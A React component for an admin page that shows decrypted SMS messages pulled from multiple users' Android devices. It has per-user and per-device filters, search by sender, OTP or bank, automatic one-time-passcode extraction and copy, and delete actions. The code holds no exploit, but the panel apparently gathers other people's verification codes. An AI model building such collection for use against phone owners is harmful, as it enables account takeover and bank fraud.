import React, { useState, useEffect } from 'react';
import { useDispatch, useSelector } from 'react-redux';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';
import { motion, AnimatePresence } from 'framer-motion';
import {
  MessageSquare,
  Search,
  Trash2,
  Copy,
  Calendar,
  Radio,
  RefreshCw,
  Zap,
  CheckSquare,
  Square,
  User,
  Smartphone,
  Filter,
  X,
  ChevronLeft,
  ChevronRight,
  ChevronsLeft,
  ChevronsRight,
  ShieldCheck
} from 'lucide-react';
import api from '../../../services/api';
import {
  openPullModal,
  openDeleteModal,
  clearFilterDevice,
  setFilterDevice
} from '../../../store/slices/uiSlice';
import { Card, Button, StatusBadge, TableSkeleton } from '../../../components/common/ui';
import PageHeader from '../../../components/common/PageHeader';
import DeleteConfirmModal from '../components/DeleteConfirmModal';
import CustomSelect from '../../../components/common/CustomSelect';
import { useToast } from '../../../components/common/Toast';

const LIMIT_OPTIONS = [
  { value: 10, label: '10 / page' },
  { value: 25, label: '25 / page' },
  { value: 50, label: '50 / page' },
  { value: 100, label: '100 / page' },
  { value: 200, label: '200 / page' }
];

export const SMSInboxPage = () => {
  const dispatch = useDispatch();
  const queryClient = useQueryClient();
  const { showToast } = useToast();

  const reduxFilterDeviceId = useSelector((s) => s.ui.filterDeviceId);
  const reduxFilterUserId = useSelector((s) => s.ui.filterUserId);

  const [search, setSearch] = useState('');
  const [simSlot, setSimSlot] = useState('ALL');
  const [page, setPage] = useState(1);
  const [limit, setLimit] = useState(25);
  const [selectedUserId, setSelectedUserId] = useState(reduxFilterUserId || null);
  const [selectedDeviceId, setSelectedDeviceId] = useState(reduxFilterDeviceId || null);
  const [selectedIds, setSelectedIds] = useState([]);

  // Sync Redux filters when user navigated from Devices page
  useEffect(() => {
    if (reduxFilterDeviceId) {
      setSelectedDeviceId(reduxFilterDeviceId);
      setPage(1);
    }
    if (reduxFilterUserId) {
      setSelectedUserId(reduxFilterUserId);
      setPage(1);
    }
  }, [reduxFilterDeviceId, reduxFilterUserId]);

  // Query users and devices summary for per-user segregated view
  const { data: summaryData, isLoading: loadingSummary } = useQuery({
    queryKey: ['usersSummary'],
    queryFn: () => api.get('/sms/users-summary')
  });

  const usersSummary = summaryData?.data || [];

  // Query SMS Messages with server-side pagination & flexible filters
  const { data, isLoading, isFetching, refetch } = useQuery({
    queryKey: [
      'messages',
      { search, simSlot, page, limit, selectedUserId, selectedDeviceId }
    ],
    queryFn: () => {
      const params = new URLSearchParams({
        page: String(page),
        limit: String(limit),
        simSlot
      });
      if (search) params.append('search', search);
      if (selectedUserId) params.append('userId', selectedUserId);
      if (selectedDeviceId) params.append('deviceId', selectedDeviceId);

      return api.get(`/sms/messages?${params.toString()}`);
    }
  });

  const messages = data?.data?.messages || [];
  const pagination = data?.data?.pagination || {
    page: 1,
    limit: 25,
    total: 0,
    totalPages: 1,
    hasPrevPage: false,
    hasNextPage: false
  };

  // Single Delete Mutation
  const deleteMutation = useMutation({
    mutationFn: (msg) => api.delete(`/sms/messages/${msg.id}`),
    onSuccess: () => {
      showToast('SMS deleted successfully', 'success');
      queryClient.invalidateQueries(['messages']);
      queryClient.invalidateQueries(['usersSummary']);
      dispatch({ type: 'ui/closeDeleteModal' });
    },
    onError: (err) => showToast(err.message || 'Delete failed', 'error')
  });

  // Batch Delete Mutation
  const batchDeleteMutation = useMutation({
    mutationFn: (messageIds) => api.post('/sms/messages/batch-delete', { messageIds }),
    onSuccess: () => {
      showToast(`${selectedIds.length} messages deleted`, 'success');
      setSelectedIds([]);
      queryClient.invalidateQueries(['messages']);
      queryClient.invalidateQueries(['usersSummary']);
    },
    onError: (err) => showToast(err.message || 'Bulk delete failed', 'error')
  });

  const toggleSelectAll = () => {
    if (selectedIds.length === messages.length) {
      setSelectedIds([]);
    } else {
      setSelectedIds(messages.map((m) => m.id));
    }
  };

  const toggleSelectOne = (id) => {
    setSelectedIds((prev) =>
      prev.includes(id) ? prev.filter((item) => item !== id) : [...prev, id]
    );
  };

  const copyToClipboard = (text, label = 'Copied to clipboard') => {
    navigator.clipboard.writeText(text);
    showToast(label, 'info');
  };

  const handleClearAllFilters = () => {
    setSelectedUserId(null);
    setSelectedDeviceId(null);
    setSearch('');
    setSimSlot('ALL');
    setPage(1);
    dispatch(clearFilterDevice());
  };

  // Find active selected user & device info for display
  const activeUser = usersSummary.find((u) => u.userId === selectedUserId);
  const activeDevice = activeUser?.devices?.find((d) => d.deviceId === selectedDeviceId);

  const startRecord = pagination.total === 0 ? 0 : (pagination.page - 1) * pagination.limit + 1;
  const endRecord = Math.min(pagination.page * pagination.limit, pagination.total);

  return (
    <div className="space-y-5">
      <PageHeader
        title="SMS Inbox & Telemetry"
        subtitle="Decrypted AES-256-GCM messages, per-user segregated inboxes, and instant OTP extraction"
        actions={
          <div className="flex flex-wrap items-center gap-2 max-w-full">
            <Button variant="outline" size="sm" onClick={() => refetch()} disabled={isFetching}>
              <RefreshCw className={`w-3.5 h-3.5 ${isFetching ? 'animate-spin' : ''}`} />
              <span className="hidden sm:inline">Refresh</span>
            </Button>
            <Button size="sm" onClick={() => dispatch(openPullModal())}>
              <Zap className="w-3.5 h-3.5 fill-current" />
              <span>Pull SMS</span>
            </Button>
          </div>
        }
      />

      {/* 1. SEPARATE PER-USER & PER-DEVICE SELECTOR BAR */}
      <div className="p-3.5 rounded-2xl bg-card border border-line shadow-card space-y-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2 text-[12px] font-bold text-ink">
            <User className="w-4 h-4 text-brand-700" />
            <span>Select Mobile User / Device:</span>
          </div>

          {(selectedUserId || selectedDeviceId) && (
            <button
              type="button"
              onClick={handleClearAllFilters}
              className="flex items-center gap-1 text-[11px] font-semibold text-danger hover:underline cursor-pointer"
            >
              <X className="w-3 h-3" />
              <span>Show All Messages</span>
            </button>
          )}
        </div>

        {/* User Chips Row */}
        <div className="flex items-center gap-2 overflow-x-auto pb-1 scrollbar-thin">
          {loadingSummary ? (
            Array.from({ length: 4 }).map((_, idx) => (
              <div
                key={idx}
                className="h-8 w-32 rounded-full bg-black/6 dark:bg-white/10 animate-pulse shrink-0"
              />
            ))
          ) : (
            <>
              <button
                type="button"
                onClick={() => {
                  setSelectedUserId(null);
                  setSelectedDeviceId(null);
                  setPage(1);
                  dispatch(clearFilterDevice());
                }}
                className={`flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-[12px] font-medium whitespace-nowrap transition-colors cursor-pointer shrink-0 ${
                  !selectedUserId && !selectedDeviceId
                    ? 'bg-brand-900 text-white font-semibold shadow-xs'
                    : 'bg-panel text-ink-2 hover:bg-brand-50 border border-line'
                }`}
              >
                <span>All Users</span>
              </button>

              {usersSummary.map((u) => {
                const isUserSelected = selectedUserId === u.userId;
                return (
                  <button
                    key={u.userId}
                    type="button"
                    onClick={() => {
                      setSelectedUserId(u.userId);
                      setSelectedDeviceId(null);
                      setPage(1);
                    }}
                    className={`flex items-center gap-2 px-3.5 py-1.5 rounded-full text-[12px] font-medium whitespace-nowrap transition-colors cursor-pointer shrink-0 ${
                      isUserSelected && !selectedDeviceId
                        ? 'bg-brand-800 text-white font-semibold shadow-xs'
                        : 'bg-panel text-ink-2 hover:bg-brand-50 border border-line'
                    }`}
                  >
                    <div className="w-4 h-4 rounded-full bg-brand-100 text-brand-900 text-[10px] grid place-items-center font-bold">
                      {u.email?.charAt(0).toUpperCase()}
                    </div>
                    <span>{u.email}</span>
                    <span
                      className={`px-1.5 py-0.2 rounded-full text-[10px] font-bold ${
                        isUserSelected
                          ? 'bg-white/20 text-white'
                          : 'bg-black/5 text-muted'
                      }`}
                    >
                      {u.totalMessages}
                    </span>
                  </button>
                );
              })}
            </>
          )}
        </div>

        {/* If a User is Selected, Show Device Sub-Chips */}
        {activeUser && activeUser.devices?.length > 0 && (
          <div className="pt-2 border-t border-line flex items-center gap-2 overflow-x-auto pb-1">
            <span className="text-[11px] text-muted flex items-center gap-1 shrink-0">
              <Smartphone className="w-3.5 h-3.5 text-brand-700" />
              Devices:
            </span>

            <button
              type="button"
              onClick={() => {
                setSelectedDeviceId(null);
                setPage(1);
              }}
              className={`px-2.5 py-1 rounded-full text-[11px] font-medium whitespace-nowrap transition-colors cursor-pointer ${
                !selectedDeviceId
                  ? 'bg-brand-700 text-white font-semibold'
                  : 'bg-panel text-ink-2 hover:bg-brand-50 border border-line'
              }`}
            >
              All Devices ({activeUser.totalMessages})
            </button>

            {activeUser.devices.map((d) => (
              <button
                key={d.deviceId}
                type="button"
                onClick={() => {
                  setSelectedDeviceId(d.deviceId);
                  setPage(1);
                }}
                className={`flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-medium whitespace-nowrap transition-colors cursor-pointer ${
                  selectedDeviceId === d.deviceId
                    ? 'bg-brand-700 text-white font-semibold'
                    : 'bg-panel text-ink-2 hover:bg-brand-50 border border-line'
                }`}
              >
                <span>{d.deviceName}</span>
                <span className="opacity-70">({d.messageCount})</span>
              </button>
            ))}
          </div>
        )}
      </div>

      {/* 2. FILTER & SEARCH TOOLBAR */}
      <div className="flex flex-col sm:flex-row items-center justify-between gap-3 p-3 rounded-2xl bg-card border border-line shadow-card">
        {/* Search Input */}
        <div className="relative w-full sm:w-80">
          <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted pointer-events-none" />
          <input
            type="text"
            placeholder="Search sender, OTP, bank..."
            value={search}
            onChange={(e) => {
              setSearch(e.target.value);
              setPage(1);
            }}
            className="w-full h-9.5 pl-10 pr-4 rounded-xl bg-panel border border-line text-[13px] text-ink focus:outline-none focus:border-brand-700"
          />
        </div>

        {/* SIM Slot & Flexible Limit Filter */}
        <div className="flex flex-wrap items-center justify-between w-full sm:w-auto gap-2">
          {/* SIM Slot Filter */}
          <div className="flex items-center gap-1">
            {['ALL', 'SIM 1', 'SIM 2'].map((slot) => (
              <button
                key={slot}
                type="button"
                onClick={() => {
                  setSimSlot(slot);
                  setPage(1);
                }}
                className={`px-3 py-1 rounded-full text-[11px] font-medium transition-colors cursor-pointer ${
                  simSlot === slot
                    ? 'bg-brand-800 text-white shadow-xs'
                    : 'bg-panel text-ink-2 hover:bg-brand-50 border border-line'
                }`}
              >
                {slot}
              </button>
            ))}
          </div>

          {/* Flexible Page Limit Selector */}
          <div className="flex items-center gap-1.5 text-[12px] text-muted">
            <span>Show:</span>
            <div className="w-28">
              <CustomSelect
                value={limit}
                onChange={(val) => {
                  setLimit(Number(val));
                  setPage(1);
                }}
                options={LIMIT_OPTIONS}
                size="sm"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Floating Bulk Action Bar */}
      <AnimatePresence>
        {selectedIds.length > 0 && (
          <motion.div
            initial={{ opacity: 0, y: 12 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 12 }}
            className="p-3 rounded-2xl bg-brand-950 text-white flex items-center justify-between shadow-hero"
          >
            <div className="flex items-center gap-2 pl-2">
              <span className="text-[13px] font-medium">
                {selectedIds.length} message{selectedIds.length > 1 ? 's' : ''} selected
              </span>
            </div>

            <div className="flex items-center gap-2">
              <Button
                variant="ghost"
                size="sm"
                className="text-white hover:bg-white/10"
                onClick={() => setSelectedIds([])}
              >
                Clear
              </Button>
              <Button
                variant="danger"
                size="sm"
                onClick={() => batchDeleteMutation.mutate(selectedIds)}
                disabled={batchDeleteMutation.isPending}
              >
                <Trash2 className="w-3.5 h-3.5" />
                <span>Delete ({selectedIds.length})</span>
              </Button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* 3. DUAL-VIEW: DESKTOP TABLE & MOBILE CARD FEED */}
      <Card className="overflow-hidden p-0">
        {/* DESKTOP TABLE VIEW (md and up) */}
        <div className="hidden md:block overflow-x-auto">
          <table className="w-full text-left text-[13px] border-collapse">
            <thead>
              <tr className="border-b border-line bg-panel/70 text-subtle text-[11px] font-semibold uppercase tracking-wider">
                <th className="py-3.5 px-4 w-10">
                  <button
                    type="button"
                    onClick={toggleSelectAll}
                    className="grid place-items-center text-muted hover:text-ink cursor-pointer"
                  >
                    {selectedIds.length > 0 && selectedIds.length === messages.length ? (
                      <CheckSquare className="w-4 h-4 text-brand-700" />
                    ) : (
                      <Square className="w-4 h-4" />
                    )}
                  </button>
                </th>
                <th className="py-3.5 px-4">Sender</th>
                <th className="py-3.5 px-4">SIM Slot</th>
                <th className="py-3.5 px-4">User & Device</th>
                <th className="py-3.5 px-4">Message Body (Decrypted)</th>
                <th className="py-3.5 px-4">Timestamp</th>
                <th className="py-3.5 px-4 text-right">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-line">
              {isLoading ? (
                <TableSkeleton cols={7} rows={8} />
              ) : messages.length === 0 ? (
                <tr>
                  <td colSpan="7" className="text-center py-16 text-muted">
                    No SMS messages found for this user/device selection.
                  </td>
                </tr>
              ) : (
                messages.map((m) => {
                  const isSelected = selectedIds.includes(m.id);
                  const otp = m.body.match(/\b\d{4,8}\b/)?.[0];
                  return (
                    <tr
                      key={m.id}
                      className={`hover:bg-brand-50/50 transition-colors ${
                        isSelected ? 'bg-brand-50/70' : ''
                      }`}
                    >
                      <td className="py-3.5 px-4">
                        <button
                          type="button"
                          onClick={() => toggleSelectOne(m.id)}
                          className="grid place-items-center text-muted hover:text-ink cursor-pointer"
                        >
                          {isSelected ? (
                            <CheckSquare className="w-4 h-4 text-brand-700" />
                          ) : (
                            <Square className="w-4 h-4" />
                          )}
                        </button>
                      </td>
                      <td className="py-3.5 px-4 font-bold text-ink whitespace-nowrap">
                        {m.sender}
                      </td>
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        {m.simSlot === 'SIM 1' && <StatusBadge tone="sim1">SIM 1</StatusBadge>}
                        {m.simSlot === 'SIM 2' && <StatusBadge tone="sim2">SIM 2</StatusBadge>}
                        {m.simSlot === 'UNKNOWN' && <StatusBadge tone="off">Unknown</StatusBadge>}
                      </td>
                      <td className="py-3.5 px-4 whitespace-nowrap">
                        <div className="flex flex-col">
                          <span className="text-[12px] font-semibold text-ink">
                            {m.deviceId?.deviceName || 'Android'}
                          </span>
                          <span className="text-[10px] text-muted">
                            {m.userId?.email || 'User'}
                          </span>
                        </div>
                      </td>
                      <td className="py-3.5 px-4 font-mono text-ink-2 max-w-md break-words leading-relaxed">
                        {m.body}
                      </td>
                      <td className="py-3.5 px-4 text-subtle whitespace-nowrap text-[12px]">
                        {new Date(m.messageDate).toLocaleString([], {
                          dateStyle: 'short',
                          timeStyle: 'short'
                        })}
                      </td>
                      <td className="py-3.5 px-4 text-right whitespace-nowrap">
                        <div className="flex items-center justify-end gap-1.5">
                          {otp && (
                            <button
                              type="button"
                              onClick={() => copyToClipboard(otp, `Copied OTP: ${otp}`)}
                              className="px-2.5 py-1 rounded-full bg-brand-100 text-brand-900 text-[11px] font-bold hover:bg-brand-200 transition-colors cursor-pointer"
                              title="Copy OTP code"
                            >
                              OTP: {otp}
                            </button>
                          )}
                          <button
                            type="button"
                            onClick={() => copyToClipboard(m.body, 'Copied SMS body')}
                            className="p-1.5 rounded-full text-muted hover:text-ink hover:bg-black/5 transition-colors cursor-pointer"
                            title="Copy full text"
                          >
                            <Copy className="w-3.5 h-3.5" />
                          </button>
                          <button
                            type="button"
                            onClick={() => dispatch(openDeleteModal(m))}
                            className="p-1.5 rounded-full text-muted hover:text-danger hover:bg-red-50 transition-colors cursor-pointer"
                            title="Delete SMS"
                          >
                            <Trash2 className="w-3.5 h-3.5" />
                          </button>
                        </div>
                      </td>
                    </tr>
                  );
                })
              )}
            </tbody>
          </table>
        </div>

        {/* MOBILE RESPONSIVE CARD STREAM (below md) */}
        <div className="md:hidden divide-y divide-line">
          {isLoading ? (
            <div className="p-4 space-y-3">
              {Array.from({ length: 5 }).map((_, idx) => (
                <div key={idx} className="p-4 rounded-2xl bg-panel border border-line animate-pulse space-y-2.5">
                  <div className="flex justify-between items-center">
                    <div className="h-4 w-28 rounded bg-black/7 dark:bg-white/10" />
                    <div className="h-3 w-16 rounded bg-black/5 dark:bg-white/10" />
                  </div>
                  <div className="h-3 w-40 rounded bg-black/5 dark:bg-white/8" />
                  <div className="h-12 w-full rounded-xl bg-black/5 dark:bg-white/8" />
                </div>
              ))}
            </div>
          ) : messages.length === 0 ? (
            <div className="text-center py-12 text-muted px-4">
              <MessageSquare className="w-10 h-10 mx-auto mb-2 opacity-30" />
              <p className="text-[14px] font-medium text-ink">No Messages Found</p>
              <p className="text-[12px] text-muted mt-1">
                Try selecting another user or pulling messages from your device.
              </p>
            </div>
          ) : (
            messages.map((m) => {
              const isSelected = selectedIds.includes(m.id);
              const otp = m.body.match(/\b\d{4,8}\b/)?.[0];
              return (
                <div
                  key={m.id}
                  className={`p-4 space-y-2.5 transition-colors ${
                    isSelected ? 'bg-brand-50/70' : 'hover:bg-brand-50/30'
                  }`}
                >
                  {/* Top Bar: Select, Sender, Slot, Date */}
                  <div className="flex items-center justify-between gap-2">
                    <div className="flex items-center gap-2.5 min-w-0">
                      <button
                        type="button"
                        onClick={() => toggleSelectOne(m.id)}
                        className="text-muted hover:text-ink cursor-pointer shrink-0"
                      >
                        {isSelected ? (
                          <CheckSquare className="w-4 h-4 text-brand-700" />
                        ) : (
                          <Square className="w-4 h-4" />
                        )}
                      </button>

                      <span className="font-bold text-[14px] text-ink truncate">
                        {m.sender}
                      </span>

                      {m.simSlot === 'SIM 1' && <StatusBadge tone="sim1">SIM 1</StatusBadge>}
                      {m.simSlot === 'SIM 2' && <StatusBadge tone="sim2">SIM 2</StatusBadge>}
                    </div>

                    <span className="text-[11px] text-muted shrink-0">
                      {new Date(m.messageDate).toLocaleTimeString([], {
                        hour: '2-digit',
                        minute: '2-digit'
                      })}
                    </span>
                  </div>

                  {/* Device Tag */}
                  <div className="text-[11px] text-muted flex items-center gap-1">
                    <Smartphone className="w-3 h-3 text-brand-700" />
                    <span>{m.deviceId?.deviceName || 'Android'}</span>
                    <span className="opacity-40">•</span>
                    <span className="truncate">{m.userId?.email}</span>
                  </div>

                  {/* Message Body */}
                  <p className="text-[13px] font-mono text-ink-2 bg-panel/70 p-3 rounded-xl border border-line leading-relaxed break-words">
                    {m.body}
                  </p>

                  {/* Bottom Actions */}
                  <div className="flex items-center justify-between pt-1">
                    <div>
                      {otp && (
                        <button
                          type="button"
                          onClick={() => copyToClipboard(otp, `Copied OTP: ${otp}`)}
                          className="px-3 py-1 rounded-full bg-brand-100 text-brand-900 text-[11px] font-bold hover:bg-brand-200 transition-colors cursor-pointer"
                        >
                          Copy OTP: {otp}
                        </button>
                      )}
                    </div>

                    <div className="flex items-center gap-1">
                      <button
                        type="button"
                        onClick={() => copyToClipboard(m.body, 'Copied SMS body')}
                        className="p-1.5 rounded-full text-muted hover:text-ink hover:bg-black/5 transition-colors cursor-pointer"
                        title="Copy text"
                      >
                        <Copy className="w-4 h-4" />
                      </button>
                      <button
                        type="button"
                        onClick={() => dispatch(openDeleteModal(m))}
                        className="p-1.5 rounded-full text-muted hover:text-danger hover:bg-red-50 transition-colors cursor-pointer"
                        title="Delete SMS"
                      >
                        <Trash2 className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                </div>
              );
            })
          )}
        </div>

        {/* 4. PROPER FLEXIBLE PAGINATION TOOLBAR */}
        <div className="flex flex-col sm:flex-row items-center justify-between gap-3 p-3.5 sm:p-4 border-t border-line bg-panel/50 text-[12px] text-muted">
          <div>
            <span>
              {isLoading ? (
                <span className="text-muted">Loading messages...</span>
              ) : (
                <>
                  Showing <strong className="text-ink font-semibold">{startRecord}</strong> to{' '}
                  <strong className="text-ink font-semibold">{endRecord}</strong> of{' '}
                  <strong className="text-ink font-semibold">{pagination.total}</strong> messages
                </>
              )}
            </span>
          </div>

          <div className="flex items-center gap-1.5">
            {/* First Page */}
            <Button
              variant="outline"
              size="sm"
              disabled={pagination.page <= 1}
              onClick={() => setPage(1)}
              className="p-1.5"
              title="First Page"
            >
              <ChevronsLeft className="w-4 h-4" />
            </Button>

            {/* Prev Page */}
            <Button
              variant="outline"
              size="sm"
              disabled={!pagination.hasPrevPage}
              onClick={() => setPage((p) => Math.max(p - 1, 1))}
              className="px-2.5"
            >
              <ChevronLeft className="w-4 h-4 mr-0.5" />
              <span>Prev</span>
            </Button>

            {/* Current Page Pill */}
            <span className="px-3 py-1 rounded-full bg-card border border-line text-[12px] font-bold text-ink">
              {pagination.page} / {pagination.totalPages}
            </span>

            {/* Next Page */}
            <Button
              variant="outline"
              size="sm"
              disabled={!pagination.hasNextPage}
              onClick={() => setPage((p) => Math.min(p + 1, pagination.totalPages))}
              className="px-2.5"
            >
              <span>Next</span>
              <ChevronRight className="w-4 h-4 ml-0.5" />
            </Button>

            {/* Last Page */}
            <Button
              variant="outline"
              size="sm"
              disabled={pagination.page >= pagination.totalPages}
              onClick={() => setPage(pagination.totalPages)}
              className="p-1.5"
              title="Last Page"
            >
              <ChevronsRight className="w-4 h-4" />
            </Button>
          </div>
        </div>
      </Card>

      <DeleteConfirmModal
        loading={deleteMutation.isPending}
        onConfirm={(msg) => deleteMutation.mutate(msg)}
      />
    </div>
  );
};

export default SMSInboxPage;
